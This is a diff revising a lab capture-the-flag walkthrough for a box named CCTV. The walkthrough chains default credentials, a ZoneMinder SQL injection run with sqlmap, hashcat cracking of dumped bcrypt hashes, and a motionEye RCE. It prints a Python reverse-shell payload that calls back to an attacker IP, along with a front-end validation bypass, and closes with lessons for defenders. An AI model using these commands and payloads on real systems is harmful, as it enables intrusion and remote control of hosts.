@@ -9,51 +9,51 @@ date: 2026-05-14
 avatar: avatar.png
 tags:
   - CVE-2024-51482
+  - GHSA-j945-qm58-4gjx
   - ZoneMinder
-  - SQL-Injection
-  - sqlmap
-  - hashcat
   - motionEye
+  - SQL-Injection
   - RCE
-  - SSH-Tunneling
-summary: A ZoneMinder instance with default creds, a juicy SQL injection, a cracked hash, and a motionEye RCE that hands us root — basically a security camera watching everything except itself.
+summary: Full lab walkthrough from recon to root, chaining default creds and a ZoneMinder SQL injection to leak credentials, then pivoting through an internal motionEye RCE to land a root shell.
 initialAccess: SQL injection on ZoneMinder's event tag-removal endpoint via CVE-2024-51482, used to dump user password hashes; cracked mark's hash with rockyou for SSH access.
 privesc: Tunneled to a local motionEye instance, recovered its admin credentials from motion.conf, and exploited an authenticated RCE in motionEye's config validation to get a root shell.
 ---
 
 # CCTV
 
-A ZoneMinder instance with default creds, a juicy SQL injection, a cracked hash, and a motionEye RCE that hands us root — basically a security camera watching everything except itself.
-SQL injection on ZoneMinder's event tag-removal endpoint via CVE-2024-51482, used to dump user password hashes; cracked mark's hash with rockyou for SSH access.
-Tunneled to a local motionEye instance, recovered its admin credentials from motion.conf, and exploited an authenticated RCE in motionEye's config validation to get a root shell.
+A ZoneMinder surveillance panel turned out to be far easier to break into than to actually watch anything on. Default admin creds got us in the door, a known SQL injection cracked open the database, and a cracked password hash bought SSH access. From there, an internal-only motionEye instance — reachable through a tunnel — had its own authenticated RCE, and that was the whole box. A camera system that saw everything except the intrusion happening on it.
 
 ---
 
-As always, we start with our nmap scan.
+## 1. Reconnaissance
+
+As always, we start with an nmap scan.
 
 ![image.png](image.png)
 
-We've got a web server running on HTTP, so let's take a look at what it's serving.
+A web server on HTTP. Let's see what it's serving.
 
 ![image.png](image%201.png)
 
-Nothing too exciting at first glance, but notice the "Staff Login" button.
+Nothing too exciting at first glance, but there's a "Staff Login" button worth a look.
 
 ![image.png](image%202.png)
 
-That leads us to a login page. Interesting.
+That leads to a login page for what turns out to be ZoneMinder.
 
-Let's try the classics first — `admin:admin` or `admin:admin123`, both suspiciously common on webapps that really should know better.
+---
+
+## 2. Initial Access — ZoneMinder SQL Injection
+
+Before anything fancy, let's try the classics: `admin:admin` and `admin:admin123`, both suspiciously common on webapps that should really know better.
 
 ![image.png](image%203.png)
 
-And just like that, we're in the admin panel with `admin:admin`. Security 101, skipped.
+And that's it — we're in the admin panel with `admin:admin`.
 
-There's also a version number sitting in the top-right corner, which is basically a free hint from the developers.
+There's also a version number in the top-right corner, effectively a free hint from the developers. A quick search turns up a matching vulnerability: [CVE-2024-51482](https://nvd.nist.gov/vuln/detail/CVE-2024-51482).
 
-A quick search turns up a matching vulnerability: [CVE-2024-51482](https://nvd.nist.gov/vuln/detail/CVE-2024-51482).
-
-Following the PoC from the official advisory ([GHSA-qm8h-3xvf-m7j3](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)), we can perform SQL injection against the target.
+Following the PoC from the official advisory ([GHSA-qm8h-3xvf-m7j3](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)), we can perform SQL injection against the target:
 
 ```bash
 ❯ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
@@ -62,13 +62,17 @@ Following the PoC from the official advisory ([GHSA-qm8h-3xvf-m7j3](https://gith
 
 ![image.png](image%204.png)
 
-As shown above, the `tid` parameter is injectable. Time to dump the database.
+The `tid` parameter is injectable. Time to dump the database.
 
 ![image.png](image%205.png)
 
 This part takes a while — sqlmap doesn't believe in rushing.
 
-Once the dust settles, we've got our hands on the users table. Let's try cracking those password hashes.
+---
+
+## 3. Credential Harvesting
+
+Once the dust settles, we've got the users table and their password hashes.
 
 | User | Hash |
 | --- | --- |
@@ -76,21 +80,25 @@ Once the dust settles, we've got our hands on the users table. Let's try crackin
 | mark | `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.` |
 | admin | `$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m` |
 
-I'll use hashcat for this, but first the hashes go into a `file.hash`.
+These are bcrypt hashes, so into a `file.hash` they go for hashcat:
 
 ```bash
 hashcat -m 3200 file.hash /usr/share/wordlists/rockyou.txt
 ```
 
-And rockyou comes through again — we get a password for `mark`: `opensesame`.
+rockyou comes through again — password for `mark`: `opensesame`.
 
-Let's put it to use.
+**Credentials:** `mark : opensesame`
+
+---
+
+## 4. SSH Access — User Flag
 
 ```bash
 ssh mark@10.129.244.156
 ```
 
-We're in, but no flag here — time to escalate.
+We're in, but there's no flag sitting here — time to escalate.
 
 ```bash
 mark@cctv:/home$ ss -tlnp
@@ -122,11 +130,13 @@ Etag: "da39a3ee5e6b4b0d3255bfef95601890afd80709"
 Content-Length: 0
 ```
 
-A quick search on motionEye tells us what we're dealing with:
+motionEye — a web-based frontend for the motion daemon, used to turn Linux devices into surveillance systems with camera management, motion detection, and recording. Fitting, for a box literally called CCTV.
 
-> motionEye is a user-friendly, web-based frontend for the motion daemon, designed to turn single-board computers (like Raspberry Pi) or Linux devices into comprehensive surveillance systems. It provides a clean interface for managing multiple cameras, offering motion detection, video streaming, and media recording capabilities.
+---
 
-Fitting, for a box literally called CCTV. Let's tunnel it to our own machine for a closer look.
+## 5. Privilege Escalation — motionEye RCE
+
+Since motionEye only listens locally, let's tunnel it over SSH for a closer look:
 
 ```bash
 ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
@@ -134,7 +144,7 @@ ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
 
 ![image.png](image%206.png)
 
-I tried the default `admin:blank password` combo, but no luck this time. Let's check the config file instead.
+The default `admin:blank password` combo doesn't work here. Time to check the config file instead:
 
 ```bash
 mark@cctv:~$ cat /etc/motioneye/motion.conf
@@ -154,15 +164,13 @@ webcontrol_parms 2
 camera camera-1.conf
 ```
 
-There's our admin credentials, hiding in plain sight.
+Admin credentials, hiding in plain sight.
 
-While digging around, I also found an RCE vulnerability affecting motionEye via the admin panel: [GHSA-j945-qm58-4gjx](https://github.com/advisories/GHSA-j945-qm58-4gjx). Let's log in as admin and check.
+While digging around, there's also an RCE vulnerability affecting motionEye via the admin panel: [GHSA-j945-qm58-4gjx](https://github.com/advisories/GHSA-j945-qm58-4gjx). Logging in as admin confirms it's worth trying:
 
 ![image.png](image%207.png)
 
-The running version matches the advisory, so let's follow the exploit steps.
-
-I set up my payload:
+The running version matches the advisory. Set up a reverse shell payload:
 
 ```bash
 $(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.59",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])').%Y-%m-%d-%H-%M-%S
@@ -174,7 +182,7 @@ Then bypassed the front-end validation with:
 configUiValid = function() { return true; };
 ```
 
-Sent the payload, and — root shell acquired.
+Sent the payload, and got a root shell.
 
 ![image.png](image%208.png)
 
@@ -192,4 +200,20 @@ root@cctv:/home/sa_mark#
 
 ![image.png](image%2010.png)
 
-And that's a wrap — the cameras were watching the network, but forgot to watch themselves. Done. 
+---
+
+## 6. Summary & Takeaways
+
+| Step | Vulnerability | Result |
+|---|---|---|
+| Initial access | Default creds (`admin:admin`) + ZoneMinder SQL injection (CVE-2024-51482) | Dumped user password hashes |
+| Lateral move | Cracked bcrypt hash for `mark` with rockyou | SSH access |
+| Privilege escalation | Leaked motionEye admin creds + authenticated RCE (GHSA-j945-qm58-4gjx) | Root shell |
+
+**Lessons for defenders:**
+- Change default admin credentials before anything goes near a network — `admin:admin` should never survive past setup.
+- Keep ZoneMinder and its dependencies patched; SQL injection in a core endpoint is a full database compromise waiting to happen.
+- Internal-only services like motionEye still need hardening. "Local only" is not the same thing as "safe," especially once an attacker has a foothold to tunnel through.
+- Config files with embedded credentials (even hashed) are still worth protecting with tight file permissions.
+
+Done.
